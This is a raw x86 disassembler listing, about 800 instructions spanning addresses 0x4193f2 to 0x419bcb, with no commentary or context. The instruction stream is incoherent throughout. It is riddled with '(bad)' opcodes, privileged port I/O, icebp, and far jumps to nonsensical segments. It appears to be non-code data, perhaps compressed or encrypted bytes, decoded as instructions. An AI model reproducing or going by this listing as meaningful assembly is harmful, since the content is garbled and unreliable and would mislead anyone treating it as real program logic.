  4193f2:	push   DWORD PTR [esi+0x5b]
  4193f5:	xchg   esi,eax
  4193f6:	push   ecx
  4193f7:	mov    esp,ebp
  4193f9:	and    DWORD PTR [eax+0x1bc14438],edx
  4193ff:	or     al,ch
  419401:	sub    esp,esi
  419403:	fisttp QWORD PTR [edx-0x39]
  419406:	adc    BYTE PTR [ebx+0x70],0x49
  41940a:	(bad)  
  41940b:	push   esi
  41940c:	shl    BYTE PTR [eax+0x71],1
  41940f:	fisubr DWORD PTR ds:0x386dd15e
  419415:	xor    eax,0xa9488635
  41941a:	sbb    al,al
  41941c:	pushf  
  41941d:	aam    0xea
  41941f:	xor    eax,DWORD PTR [esi]
  419421:	imul   ebp,DWORD PTR [ecx],0x87fbb24
  419427:	cmp    ebp,edx
  419429:	adc    edx,DWORD PTR [esp+ebp*2-0x97c2484]
  419430:	sbb    al,0xe8
  419432:	xlat   BYTE PTR ds:[ebx]
  419433:	test   BYTE PTR [esi-0x7a04db95],ah
  419439:	jne    0x419404
  41943b:	fwait
  41943c:	ror    DWORD PTR [ebp+esi*1-0x13ca386a],1
  419443:	(bad)  
  419444:	sbb    ebx,DWORD PTR [ebx-0x193dbf74]
  41944a:	enter  0x3b28,0xad
  41944e:	jns    0x419425
  419450:	(bad)  
  419451:	ss (bad) 
  419454:	mov    ebx,0xb6dd5ebb
  419459:	into   
  41945a:	sti    
  41945b:	ret    
  41945c:	cmp    DWORD PTR [edx+0xf],ebx
  41945f:	fwait
  419460:	idiv   ebp
  419462:	retf   
  419463:	(bad)  
  419465:	sbb    al,0xa3
  419467:	rcr    bl,cl
  419469:	sahf   
  41946a:	bnd ret 
  41946c:	xchg   BYTE PTR [ebx+eiz*8],bh
  41946f:	mov    ebp,0x96368cb5
  419474:	fwait
  419475:	xor    al,dl
  419477:	mov    eax,0x6bda11c6
  41947c:	fs out 0xcc,eax
  41947f:	mov    bh,0xd2
  419481:	xchg   esi,eax
  419482:	sahf   
  419483:	push   0x2d
  419485:	lods   eax,DWORD PTR ds:[esi]
  419486:	sub    al,0xaa
  419488:	(bad)  
  419489:	out    0x72,al
  41948b:	jnp    0x4194a4
  41948d:	jge    0x4194c8
  41948f:	in     al,dx
  419490:	mov    al,0x88
  419492:	or     bl,0x9e
  419495:	inc    ecx
  419496:	mov    ebp,0x1e6393a
  41949b:	sti    
  41949c:	loope  0x41946a
  41949e:	fs ins DWORD PTR es:[edi],dx
  4194a0:	sbb    eax,0x199fa592
  4194a5:	leave  
  4194a6:	in     al,0x59
  4194a8:	mov    ch,0x60
  4194aa:	pop    esp
  4194ab:	push   es
  4194ac:	inc    ebx
  4194ad:	in     eax,0x38
  4194af:	aam    0x72
  4194b1:	(bad)  
  4194b2:	pop    esp
  4194b3:	and    dh,bh
  4194b5:	mov    es,WORD PTR [eax+0x60]
  4194b8:	dec    edi
  4194b9:	xchg   ah,dh
  4194bb:	mov    bl,0x1b
  4194bd:	ss jmp 0x880d:0x72b401fe
  4194c5:	test   DWORD PTR [ecx],eax
  4194c7:	cmp    edi,DWORD PTR [eax]
  4194c9:	dec    esp
  4194ca:	or     DWORD PTR [eax-0x58],0x5b
  4194ce:	mov    cl,0xa9
  4194d0:	adc    ch,BYTE PTR [esi+0x3570452]
  4194d6:	sbb    al,0xa1
  4194d8:	push   esi
  4194d9:	ss repnz xchg ebx,eax
  4194dc:	loopne 0x41950c
  4194de:	mov    esp,0xa65db4b
  4194e3:	fnstenv [ecx-0x40]
  4194e6:	add    DWORD PTR ss:[ebx+0x2f],eax
  4194ea:	popa   
  4194eb:	pop    ss
  4194ec:	add    eax,0x210d7ead
  4194f1:	cmp    eax,0x687431bf
  4194f6:	das    
  4194f7:	jmp    0x224e:0x5dab35a5
  4194fe:	xchg   esp,eax
  4194ff:	jmp    0x620:0xa392bc29
  419506:	fwait
  419507:	(bad)  
  419508:	jmp    0x419504
  41950a:	std    
  41950b:	loop   0x4194b6
  41950d:	shl    DWORD PTR [ecx-0x15d4aa8c],1
  419513:	lahf   
  419514:	adc    BYTE PTR [ebp-0x21],bh
  419517:	inc    esp
  419518:	rcl    DWORD PTR [ecx],1
  41951a:	stos   BYTE PTR es:[edi],al
  41951b:	(bad)  
  41951c:	fcomp  st(5)
  41951e:	out    dx,eax
  41951f:	push   esi
  419520:	mov    ah,0xdb
  419522:	int3   
  419523:	aaa    
  419524:	shl    BYTE PTR [ebx],cl
  419526:	popf   
  419527:	cmp    al,BYTE PTR ds:0xade8c755
  41952d:	push   DWORD PTR [eax+0xf1b2799]
  419533:	mov    ah,BYTE PTR [ebp+0x56]
  419536:	arpl   WORD PTR [ebx+0x48c2b629],ax
  41953c:	scas   eax,DWORD PTR es:[edi]
  41953d:	jae    0x4194f8
  41953f:	add    DWORD PTR [eax],eax
  419541:	xor    BYTE PTR [eax+0x46],0x5a
  419545:	fnstcw WORD PTR [esi-0x8]
  419548:	jge    0x4194fe
  41954a:	adc    eax,0xcee7b3a3
  41954f:	sbb    al,0xac
  419551:	pop    edi
  419552:	pusha  
  419553:	mov    WORD PTR [ebp+0x13],?
  419556:	mov    al,BYTE PTR [edi+0x7c]
  419559:	add    al,0x4c
  41955b:	lods   eax,DWORD PTR ds:[esi]
  41955c:	and    ax,0x9d32
  419560:	push   0x42
  419562:	ds jns 0x41956b
  419565:	data16 ins BYTE PTR es:[edi],dx
  419567:	xor    ebp,DWORD PTR [ecx+0x20]
  41956a:	mov    esi,0xce8be7c8
  41956f:	fwait
  419570:	xchg   esi,eax
  419571:	stos   BYTE PTR es:[edi],al
  419572:	les    esp,FWORD PTR [edi-0x69]
  419575:	adc    DWORD PTR [edx+0x7f],ebp
  419578:	cwde   
  419579:	outs   dx,BYTE PTR ds:[esi]
  41957a:	xor    ebx,DWORD PTR [edi-0x5e]
  41957d:	(bad)
  419580:	sub    eax,0xe543d00e
  419585:	mov    edi,0x97a86eb6
  41958a:	data16 daa 
  41958c:	je     0x419526
  41958e:	jle    0x419560
  419590:	(bad)  
  419591:	out    dx,eax
  419592:	cmp    eax,0xbd7a430b
  419597:	retf   
  419598:	jge    0x419557
  41959a:	dec    esi
  41959b:	add    BYTE PTR [di],dh
  41959e:	stc    
  41959f:	sar    DWORD PTR [esi],cl
  4195a1:	mov    eax,0x726c9692
  4195a6:	push   edx
  4195a7:	js     0x419538
  4195a9:	add    DWORD PTR [eax-0x7c47d451],0xad616473
  4195b3:	fbstp  TBYTE PTR [eax+edx*4-0x471d809f]
  4195ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195bb:	mov    dl,BYTE PTR [ecx+0x5e]
  4195be:	call   0xc75dd67
  4195c3:	arpl   WORD PTR [ebx+0x35da06df],cx
  4195c9:	dec    eax
  4195ca:	(bad)  
  4195cb:	retf   0x8106
  4195ce:	or     ecx,edi
  4195d0:	ins    BYTE PTR es:[edi],dx
  4195d1:	jle    0x419602
  4195d3:	rol    bh,0x1e
  4195d6:	mov    edx,0xc882c36a
  4195db:	loopne 0x419629
  4195dd:	push   ss
  4195de:	repnz test DWORD PTR [ebx-0x48],ebx
  4195e2:	push   ebp
  4195e3:	and    eax,0x8f84060e
  4195e8:	xor    al,0xb7
  4195ea:	nop
  4195eb:	dec    esi
  4195ec:	mov    bl,0x9f
  4195ee:	add    DWORD PTR [bx-0x66],ebp
  4195f2:	jge    0x4195a2
  4195f4:	cdq    
  4195f5:	frstor [eax-0x5d2c1821]
  4195fb:	cwde   
  4195fc:	cmp    al,0xf4
  4195fe:	jne    0x4195c0
  419600:	jnp    0x419623
  419602:	int3   
  419603:	dec    esi
  419604:	push   ds
  419605:	jl     0x4195a9
  419607:	and    cl,BYTE PTR [ebp+0x7a55f632]
  41960d:	and    BYTE PTR [edi+0x28c458d3],ah
  419613:	sti    
  419614:	add    edx,DWORD PTR [eax]
  419616:	into   
  419617:	loop   0x4195a9
  419619:	push   0x36
  41961b:	int    0x14
  41961d:	inc    DWORD PTR [edi-0x66b4019f]
  419623:	adc    al,0x1e
  419625:	dec    esi
  419626:	cmp    ch,BYTE PTR [esi-0x2c]
  419629:	ja     0x4195ed
  41962b:	loop   0x4195c5
  41962d:	shr    DWORD PTR [ebx-0x53],0x93
  419631:	xchg   esi,eax
  419632:	jns    0x4196a5
  419634:	sub    esi,DWORD PTR [edi+0x18]
  419637:	mov    esi,0x25620012
  41963c:	push   esp
  41963d:	test   BYTE PTR cs:[ecx],0x3f
  419641:	pop    es
  419642:	cmc    
  419643:	jmp    0x419640
  419645:	stos   BYTE PTR es:[edi],al
  419646:	out    0xf4,al
  419648:	sahf   
  419649:	cli    
  41964a:	push   cs
  41964b:	mov    eax,ds:0xd8abfd31
  419650:	cdq    
  419651:	or     eax,0xfa17cea3
  419656:	ret    
  419657:	adc    BYTE PTR [ebx],bh
  419659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41965a:	sbb    al,0x5
  41965c:	jmp    0x8d65:0x8309f36d
  419663:	cmp    al,0xd3
  419665:	mov    al,ds:0xacad7eae
  41966a:	pop    ecx
  41966b:	repnz push ebp
  41966d:	xchg   ebx,eax
  41966e:	icebp  
  41966f:	jmp    0x310d87b4
  419674:	fwait
  419675:	out    dx,eax
  419676:	ss mov dl,0x9d
  419679:	cmp    cl,BYTE PTR [ebx]
  41967b:	imul   eax,DWORD PTR [edi],0xcb2d2154
  419681:	pusha  
  419682:	rcl    ebp,1
  419684:	sbb    eax,0xbcaffe59
  419689:	adc    BYTE PTR [esi+0x50],dh
  41968c:	mov    ecx,0xe2b4f76
  419691:	push   edx
  419692:	fldcw  WORD PTR [esi-0x75]
  419695:	shl    DWORD PTR [esi-0x6d4a157a],1
  41969b:	pop    ebx
  41969c:	in     eax,dx
  41969d:	mov    ds,esi
  41969f:	retf   0x9294
  4196a2:	add    DWORD PTR [esi-0x6f],ebx
  4196a5:	jecxz  0x4196d6
  4196a7:	aas    
  4196a8:	scas   al,BYTE PTR es:[edi]
  4196a9:	push   cs
  4196aa:	(bad)  
  4196ab:	les    ecx,FWORD PTR ds:0xcad5820a
  4196b1:	sub    BYTE PTR [esi+0x1c6b854a],ch
  4196b7:	ret    
  4196b8:	cmc    
  4196b9:	pop    esi
  4196ba:	mov    al,ds:0xde9abfd2
  4196bf:	outs   dx,BYTE PTR ds:[esi]
  4196c0:	add    BYTE PTR [esp+ebx*1],al
  4196c3:	or     eax,0x9e7d90a8
  4196c8:	cmp    eax,0x1f5258d
  4196cd:	inc    edx
  4196ce:	in     al,dx
  4196cf:	mov    bl,0x65
  4196d2:	xchg   ecx,eax
  4196d3:	xchg   edi,eax
  4196d4:	dec    edi
  4196d5:	outs   dx,BYTE PTR fs:[esi]
  4196d7:	mov    ds:0xeaa0e156,al
  4196dc:	aas    
  4196dd:	dec    edx
  4196de:	jp     0x41967d
  4196e0:	jmp    0xa945:0x7971761c
  4196e7:	jmp    0x419685
  4196e9:	popa   
  4196ea:	pop    ds
  4196eb:	push   es
  4196ec:	push   0x3c
  4196ee:	pop    esp
  4196ef:	out    0xa4,al
  4196f1:	dec    edi
  4196f2:	pusha  
  4196f3:	sbb    ecx,ebp
  4196f5:	retf   
  4196f6:	out    dx,eax
  4196f7:	das    
  4196f8:	cmp    BYTE PTR [ecx+0x3845b546],dl
  4196fe:	out    0xfa,eax
  419700:	mov    ds:0x45218988,eax
  419705:	adc    dl,ch
  419707:	js     0x419742
  419709:	push   ebp
  41970a:	adc    dh,dl
  41970c:	adc    DWORD PTR [edi-0x59],0xf7ebf096
  419713:	dec    esi
  419714:	(bad)  
  419715:	cmp    eax,0x3e1692ae
  41971a:	dec    edi
  41971b:	inc    ebx
  41971c:	mov    ch,0xc4
  41971e:	nop
  41971f:	imul   edi,eax,0x32
  419722:	xchg   edi,eax
  419723:	inc    edx
  419724:	add    al,0xf3
  419726:	sbb    al,0x5f
  419728:	mov    esp,0x46572c3e
  41972d:	jg     0x4197aa
  41972f:	aad    0x7a
  419731:	add    BYTE PTR [edi+0x45],ah
  419734:	inc    eax
  419735:	inc    edx
  419736:	ins    DWORD PTR es:[edi],dx
  419737:	xchg   esi,eax
  419738:	dec    edi
  419739:	dec    ebp
  41973a:	cli    
  41973b:	out    0xf1,al
  41973d:	mov    bh,0x50
  41973f:	inc    esp
  419740:	push   es
  419741:	mov    dh,dl
  419743:	shl    BYTE PTR [edi-0x5b],1
  419746:	sub    eax,0x1f4dcb24
  41974b:	add    ah,al
  41974d:	loop   0x41973f
  41974f:	adc    edi,edi
  419751:	call   DWORD PTR [edi+0x7b40ab44]
  419757:	pop    ss
  419758:	jle    0x419713
  41975a:	add    dl,BYTE PTR [ecx]
  41975c:	pop    esi
  41975d:	sbb    eax,0xb4ae9a22
  419762:	or     BYTE PTR [edx+0x4baa8602],0xcd
  419769:	in     eax,dx
  41976a:	data16 fucom st(2)
  41976d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41976e:	adc    DWORD PTR [esi+0x7f],edi
  419771:	jb     0x419794
  419773:	stc    
  419774:	mov    eax,ds:0x180dcfc0
  419779:	in     eax,dx
  41977a:	lods   al,BYTE PTR ds:[esi]
  41977b:	std    
  41977c:	dec    edx
  41977d:	push   ebp
  41977e:	ss das 
  419780:	jmp    0x4197f7
  419782:	adc    dh,BYTE PTR [esi]
  419784:	sub    BYTE PTR [edi],bl
  419786:	push   es
  419787:	sbb    eax,DWORD PTR [esi]
  419789:	jno    0x419777
  41978b:	inc    edi
  41978c:	arpl   WORD PTR [edi],si
  41978e:	scas   eax,DWORD PTR es:[edi]
  41978f:	or     BYTE PTR [ecx-0x13afa93b],al
  419795:	jecxz  0x419743
  419797:	in     eax,0x21
  419799:	fstp   TBYTE PTR [edx]
  41979b:	mov    gs,ebp
  41979d:	stos   DWORD PTR es:[edi],eax
  41979e:	dec    ecx
  41979f:	dec    edx
  4197a0:	inc    edx
  4197a1:	pusha  
  4197a2:	or     DWORD PTR ds:0xb5342812,ebp
  4197a8:	repz mul DWORD PTR [esi+0x4ecf4d57]
  4197af:	push   ss
  4197b0:	test   eax,0x4792e7ea
  4197b5:	mov    al,0xb0
  4197b7:	aas    
  4197b8:	ret    
  4197b9:	or     eax,0xfc5e6fc2
  4197be:	ds mov bh,0xd3
  4197c1:	pop    edx
  4197c2:	mov    dh,0x48
  4197c4:	mov    bl,0x37
  4197c6:	ds clc 
  4197c8:	aas    
  4197c9:	jp     0x419797
  4197cb:	mov    edi,0xe7a45b2b
  4197d0:	pop    ebp
  4197d1:	pop    ds
  4197d2:	jne    0x4197fd
  4197d4:	cmp    al,0x42
  4197d6:	fstp   QWORD PTR [edi+0x79946d6a]
  4197dc:	inc    esp
  4197dd:	clc    
  4197de:	popf   
  4197df:	jmp    0xbce6:0x5eb03a41
  4197e6:	jno    0x419857
  4197e8:	sub    ebp,DWORD PTR [edx+0x25d7e21e]
  4197ee:	in     eax,dx
  4197ef:	cmp    eax,0x9ad688f2
  4197f4:	xor    BYTE PTR [ecx+0xd185f34],dl
  4197fa:	inc    eax
  4197fb:	mov    bl,0xf5
  4197fd:	mul    BYTE PTR [esi+0x3ee7d34c]
  419803:	lods   al,BYTE PTR ds:[esi]
  419804:	push   esi
  419805:	inc    ebp
  419806:	lea    ebx,[edx-0x61]
  419809:	mov    edi,0x923ab2ea
  41980e:	add    eax,0x4c075c4d
  419813:	into   
  419814:	xor    BYTE PTR [ecx],bl
  419816:	sub    eax,DWORD PTR [edx]
  419818:	test   al,0x17
  41981a:	shr    BYTE PTR [esi-0x52cb259c],cl
  419820:	mov    cl,0x50
  419822:	add    DWORD PTR [edi+0x41],0x57
  419826:	les    edx,FWORD PTR [eax]
  419828:	xchg   edx,eax
  419829:	dec    eax
  41982a:	sbb    BYTE PTR [ebp+0x46],0x69
  41982e:	idiv   BYTE PTR [ebx]
  419830:	jle    0x419817
  419832:	cmp    DWORD PTR [ebx],esi
  419834:	outs   dx,BYTE PTR ds:[esi]
  419835:	sbb    al,0xc9
  419837:	mov    ebx,0x6a4269ca
  41983c:	enter  0x8084,0xaf
  419840:	mov    es,WORD PTR [ebp+0x8]
  419843:	xchg   edx,eax
  419844:	mov    dh,BYTE PTR [ebx-0x3f087331]
  41984a:	(bad)  
  41984b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41984c:	test   eax,0xb2e9e18c
  419851:	dec    ebx
  419852:	daa    
  419853:	or     eax,0x4
  419856:	shl    BYTE PTR [ecx-0x172a2e6d],1
  41985c:	shr    DWORD PTR [ebp-0x35],0x20
  419860:	mov    al,ds:0x2d3b384d
  419865:	jae    0x41982c
  419867:	popf   
  419868:	add    ch,BYTE PTR ds:0x28e7402e
  41986e:	mov    dh,bh
  419870:	popf   
  419871:	pop    edi
  419872:	xchg   esp,eax
  419873:	scas   eax,DWORD PTR es:[edi]
  419874:	dec    edi
  419875:	or     dl,BYTE PTR [eax-0x20]
  419878:	mov    eax,0x470e8320
  41987d:	test   al,0xb2
  41987f:	xchg   esi,eax
  419880:	repnz fabs 
  419883:	fwait
  419884:	mov    al,0x91
  419886:	cmp    DWORD PTR [ebp+0x7e3500a7],ebx
  41988c:	or     eax,DWORD PTR [edx+0x3e20312b]
  419892:	scas   al,BYTE PTR es:[edi]
  419893:	lods   al,BYTE PTR ds:[esi]
  419894:	cmp    edi,DWORD PTR [eax-0x24]
  419897:	int3   
  419898:	stos   BYTE PTR es:[edi],al
  419899:	mov    ebx,DWORD PTR [ebx]
  41989b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41989c:	push   es
  41989d:	xlat   BYTE PTR ds:[ebx]
  41989e:	pop    ebp
  41989f:	repz cmp eax,0x5df4c7da
  4198a5:	xchg   BYTE PTR [edx],dh
  4198a7:	test   eax,0x33cef45b
  4198ac:	mov    al,0x2c
  4198ae:	adc    dl,ah
  4198b0:	aam    0xc1
  4198b2:	add    DWORD PTR [edi-0x2cc57011],0xb36c9295
  4198bc:	jecxz  0x419866
  4198be:	sub    BYTE PTR [edi+ebp*8],ch
  4198c1:	sbb    cl,BYTE PTR [edx-0x7]
  4198c4:	mov    ebp,0x70bcd0d3
  4198c9:	pop    ds
  4198ca:	adc    eax,0xfca300d3
  4198cf:	test   eax,0x120d1b48
  4198d4:	ins    BYTE PTR es:[edi],dx
  4198d5:	and    dl,BYTE PTR [ebp+0x2a]
  4198d8:	xor    al,0xa3
  4198da:	mov    esi,0x3785e31f
  4198df:	xor    ah,BYTE PTR [esi+0x78fcba75]
  4198e5:	nop
  4198e6:	or     al,0x82
  4198e8:	cmp    bh,BYTE PTR [ebp+0x71]
  4198eb:	add    dh,dh
  4198ed:	lods   eax,DWORD PTR cs:[esi]
  4198ef:	leave  
  4198f0:	icebp  
  4198f1:	das    
  4198f2:	pop    ecx
  4198f3:	shl    DWORD PTR [edx+0x1b5cc94b],1
  4198f9:	xchg   ebp,eax
  4198fa:	dec    edx
  4198fb:	xor    bh,BYTE PTR [eax-0x650c2bcb]
  419901:	jl     0x4198a1
  419903:	push   ds
  419904:	in     al,dx
  419905:	jb     0x419901
  419907:	outs   dx,DWORD PTR ds:[esi]
  419908:	push   eax
  419909:	sub    ch,bl
  41990b:	out    dx,al
  41990c:	lea    edx,[ecx+edi*2-0x4e]
  419910:	in     eax,0x2c
  419912:	xor    al,BYTE PTR [edi]
  419914:	dec    esp
  419915:	mov    ebp,0xe88826d9
  41991a:	add    BYTE PTR [ecx],dh
  41991c:	push   ss
  41991d:	pop    esi
  41991e:	jge    0x419985
  419920:	xor    ch,cl
  419922:	icebp  
  419923:	aas    
  419924:	cmp    bh,dl
  419926:	mov    ds:0x8e53cd00,al
  41992b:	std    
  41992c:	jns    0x419908
  41992e:	cmp    dl,BYTE PTR ds:0x69f5b150
  419934:	aas    
  419935:	add    BYTE PTR [esi+0x1c],bh
  419938:	push   edi
  419939:	add    DWORD PTR [edx+0x3cc252ce],esi
  41993f:	mov    ah,0x72
  419941:	push   ds
  419942:	bound  eax,QWORD PTR [ebx+0x3f]
  419945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419946:	idiv   DWORD PTR [esi-0x4a903aa1]
  41994c:	push   ss
  41994d:	mov    ah,0x81
  41994f:	xchg   edx,eax
  419950:	(bad)  
  419951:	jle    0x4198f9
  419953:	add    edi,ecx
  419955:	stos   BYTE PTR es:[edi],al
  419956:	sahf   
  419957:	pusha  
  419958:	add    ch,dh
  41995a:	arpl   cx,dx
  41995c:	das    
  41995d:	and    eax,0x229ca864
  419962:	xchg   esi,eax
  419963:	mov    ds:0x8bce8ee7,eax
  419968:	dec    ebx
  419969:	xchg   esi,eax
  41996a:	sbb    dl,BYTE PTR [edi-0x38]
  41996d:	fs in  eax,0xcf
  419970:	or     edi,DWORD PTR [edx-0x15]
  419973:	loope  0x4199ec
  419975:	sub    esp,DWORD PTR [eax+edi*8]
  419978:	mov    fs,edx
  41997a:	xor    BYTE PTR [eax-0x5e],ah
  41997d:	mov    ds:0xc2d2dea7,eax
  419982:	and    DWORD PTR [ebp+0x6d551089],esp
  419988:	fadd   QWORD PTR [edi]
  41998a:	bound  ebp,QWORD PTR [edx]
  41998c:	sub    BYTE PTR [edx],ah
  41998e:	in     al,dx
  41998f:	dec    esp
  419990:	cld    
  419991:	mov    cs,WORD PTR [eax-0x7187bd32]
  419997:	jnp    0x4199bc
  419999:	and    esp,DWORD PTR [ebp-0x72aa704a]
  41999f:	sbb    eax,0x18af79ae
  4199a4:	add    BYTE PTR [ecx-0xd],0x69
  4199a8:	xchg   ebx,eax
  4199a9:	add    BYTE PTR [ebp+0x79f6017b],0x57
  4199b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199b1:	push   esi
  4199b2:	imul   DWORD PTR [ebx+ebp*1-0x4c8e1f43]
  4199b9:	cmp    edi,DWORD PTR [eax-0x675469b]
  4199bf:	lahf   
  4199c0:	or     al,BYTE PTR [esi-0x1bd96500]
  4199c6:	pusha  
  4199c7:	shl    BYTE PTR [ecx+0x5c],1
  4199ca:	(bad)  
  4199cb:	inc    DWORD PTR [ebx-0x49]
  4199ce:	(bad)  
  4199cf:	dec    ecx
  4199d0:	jmp    0x4199fb
  4199d2:	cdq    
  4199d3:	push   edx
  4199d4:	in     al,dx
  4199d5:	jnp    0x4199f0
  4199d7:	fcom   st(1)
  4199d9:	lahf   
  4199da:	dec    eax
  4199db:	nop
  4199dc:	(bad)  
  4199dd:	rol    esp,cl
  4199df:	(bad)  
  4199e1:	mov    ds:0x8f50d56d,eax
  4199e6:	mov    WORD PTR [ebx-0x52b82766],?
  4199ec:	repnz cmp eax,0x933d6ae4
  4199f2:	sbb    BYTE PTR ds:0xbf52acb9,dh
  4199f8:	pop    eax
  4199f9:	mov    cs,WORD PTR [edi+0x68]
  4199fc:	popf   
  4199fd:	mov    bh,0x28
  4199ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a00:	xor    bl,BYTE PTR [esi-0x2a7e1aa4]
  419a06:	stos   BYTE PTR es:[edi],al
  419a07:	aam    0xdf
  419a09:	pop    eax
  419a0a:	scas   al,BYTE PTR es:[edi]
  419a0b:	sub    eax,0x22875063
  419a10:	mov    eax,0x90f64f1c
  419a15:	scas   eax,DWORD PTR es:[edi]
  419a16:	adc    al,0x58
  419a18:	ins    BYTE PTR es:[edi],dx
  419a19:	in     al,0x93
  419a1b:	int3   
  419a1c:	fnsave [ebp-0x70219820]
  419a22:	sbb    DWORD PTR [esi-0x362cd76e],eax
  419a28:	xchg   esi,eax
  419a29:	addr16 push ecx
  419a2b:	call   0x6b305c55
  419a30:	fisttp QWORD PTR [edx+0x2ab4b7f5]
  419a36:	icebp  
  419a37:	pop    esp
  419a38:	stos   DWORD PTR es:[edi],eax
  419a39:	inc    edi
  419a3a:	dec    BYTE PTR [ecx+0x893bdba]
  419a40:	mov    WORD PTR [edi+ebx*2-0x597b58ae],?
  419a47:	call   0x474a:0x4a9e2001
  419a4e:	sub    eax,0xa7d70909
  419a53:	mov    DWORD PTR [eax],ebx
  419a55:	jg     0x419aba
  419a57:	push   cs
  419a58:	mov    ah,0x11
  419a5a:	jecxz  0x419a92
  419a5c:	sub    DWORD PTR cs:[eax],eax
  419a5f:	aaa    
  419a60:	cs ret 0x3f57
  419a64:	add    al,0x18
  419a66:	jl     0x419a78
  419a68:	fsubp  st(4),st
  419a6a:	aaa    
  419a6b:	xor    eax,0x5297b224
  419a70:	jne    0x419ab6
  419a72:	aas    
  419a73:	jno    0x419a5f
  419a75:	shl    BYTE PTR [esi],1
  419a77:	inc    eax
  419a78:	outs   dx,BYTE PTR ds:[esi]
  419a79:	test   al,0xe6
  419a7b:	push   eax
  419a7c:	inc    esi
  419a7d:	or     BYTE PTR [edx+0x6e9be33],ch
  419a83:	test   al,0x73
  419a85:	mov    DWORD PTR ds:0x14159f78,esp
  419a8b:	stc    
  419a8c:	clc    
  419a8d:	stos   BYTE PTR es:[edi],al
  419a8e:	fwait
  419a8f:	jecxz  0x419a50
  419a91:	fucompp 
  419a93:	and    bh,ch
  419a95:	fisttp QWORD PTR [esi-0x5edb8f37]
  419a9b:	std    
  419a9c:	(bad)  
  419a9d:	mov    edx,0x625b81f8
  419aa2:	ja     0x419ab0
  419aa4:	(bad)  
  419aa5:	inc    BYTE PTR [ebp+0x7e4065fb]
  419aab:	mov    bh,0xc7
  419aad:	and    BYTE PTR [esp+esi*8+0x210594ae],cl
  419ab4:	arpl   WORD PTR ds:0x55ba3505,bp
  419aba:	int3   
  419abb:	or     BYTE PTR [ecx+edx*1],0xd1
  419abf:	mov    eax,0x39dbe0eb
  419ac4:	pop    es
  419ac5:	fstp   DWORD PTR [esi+0x3ece5c2a]
  419acb:	sub    DWORD PTR ss:[esi-0x40],edi
  419acf:	pop    eax
  419ad0:	fnstsw WORD PTR [esi+0x2d]
  419ad3:	aas    
  419ad4:	pop    es
  419ad5:	or     edi,DWORD PTR [ebx+edx*2-0x20]
  419ad9:	mov    al,ds:0x2373ee7f
  419ade:	loopne 0x419afa
  419ae0:	push   0xffffff90
  419ae2:	push   eax
  419ae3:	sub    esp,ebx
  419ae5:	xchg   BYTE PTR [edx],cl
  419ae7:	out    dx,eax
  419ae8:	pusha  
  419ae9:	cdq    
  419aea:	jle    0x419b43
  419aec:	cmp    ebp,0xffffff83
  419aef:	mov    ch,0x83
  419af1:	jl     0x419ae8
  419af3:	jp     0x419a7f
  419af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419af6:	fnstcw WORD PTR [ebx+0x6b]
  419af9:	ins    BYTE PTR es:[edi],dx
  419afa:	push   esi
  419afb:	lock dec eax
  419afd:	mov    esp,0xe8f1f8b0
  419b02:	je     0x419af9
  419b04:	push   edx
  419b05:	int3   
  419b06:	mov    al,0xa2
  419b08:	push   edx
  419b09:	add    ecx,DWORD PTR [eax]
  419b0b:	mov    ds,WORD PTR [edi+eax*2-0x2d]
  419b0f:	ja     0x419b29
  419b11:	out    dx,eax
  419b12:	cwde   
  419b13:	xor    al,al
  419b15:	inc    ecx
  419b16:	mov    al,0x4b
  419b18:	mov    bh,0x74
  419b1a:	jp     0x419b36
  419b1c:	loope  0x419b73
  419b1e:	and    eax,0xd08aed6b
  419b23:	sbb    ecx,DWORD PTR [ebp+eax*4-0xb9e3f2f]
  419b2a:	mov    al,ds:0x13a8fe78
  419b2f:	shl    ch,1
  419b31:	sbb    eax,0x7785e64b
  419b36:	das    
  419b37:	push   0x1d7cdaf
  419b3c:	sar    esi,0x6
  419b3f:	cmp    al,0x9b
  419b41:	sahf   
  419b42:	in     al,dx
  419b43:	dec    DWORD PTR [eax+0x47]
  419b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b47:	mov    ecx,0x202e1a3d
  419b4c:	and    eax,edx
  419b4e:	xchg   DWORD PTR [ebx-0x66],edi
  419b51:	sbb    al,0xf8
  419b53:	mov    ah,0xc9
  419b55:	pop    eax
  419b56:	icebp  
  419b57:	pusha  
  419b58:	stc    
  419b59:	std    
  419b5a:	lds    ebx,FWORD PTR [edx-0x1d124d18]
  419b60:	dec    ebp
  419b61:	js     0x419afa
  419b63:	(bad)  
  419b64:	jnp    0x419b38
  419b66:	aam    0xfa
  419b68:	push   edi
  419b69:	popa   
  419b6a:	cmp    esp,ecx
  419b6c:	mov    dh,0xb
  419b6e:	xor    ebp,DWORD PTR [eax+eax*8-0x4b]
  419b72:	fisttp DWORD PTR ds:0x86003857
  419b78:	mov    bh,BYTE PTR [edx]
  419b7a:	and    bl,bl
  419b7c:	scas   eax,DWORD PTR es:[edi]
  419b7d:	adc    ebp,DWORD PTR [eax+0x3f]
  419b80:	add    bl,bh
  419b82:	not    DWORD PTR [edi+edx*1+0x26]
  419b86:	jecxz  0x419b21
  419b88:	mov    ch,0x61
  419b8a:	cmc    
  419b8b:	xlat   BYTE PTR ds:[ebx]
  419b8c:	lods   eax,DWORD PTR ds:[esi]
  419b8d:	pop    eax
  419b8e:	sub    edx,DWORD PTR [ebx-0x7d]
  419b91:	mov    ah,0x25
  419b93:	push   edx
  419b94:	jo     0x419b71
  419b96:	cmp    al,0x9f
  419b98:	loop   0x419bbc
  419b9a:	call   0x3247:0x507a2028
  419ba1:	add    DWORD PTR [ebp-0x63],edx
  419ba4:	pop    edx
  419ba5:	dec    esp
  419ba6:	ins    DWORD PTR es:[edi],dx
  419ba7:	mov    esi,fs
  419ba9:	mov    ecx,0xe0560b96
  419bae:	mov    ebp,0x9c1245a9
  419bb3:	ss (bad) 
  419bb5:	aam    0xe6
  419bb7:	sbb    eax,0x5178679c
  419bbc:	rcr    al,0x4
  419bbf:	mov    ds:0xb4c3be25,eax
  419bc4:	adc    BYTE PTR [edi-0x697611a9],0xa
  419bcb:	into   
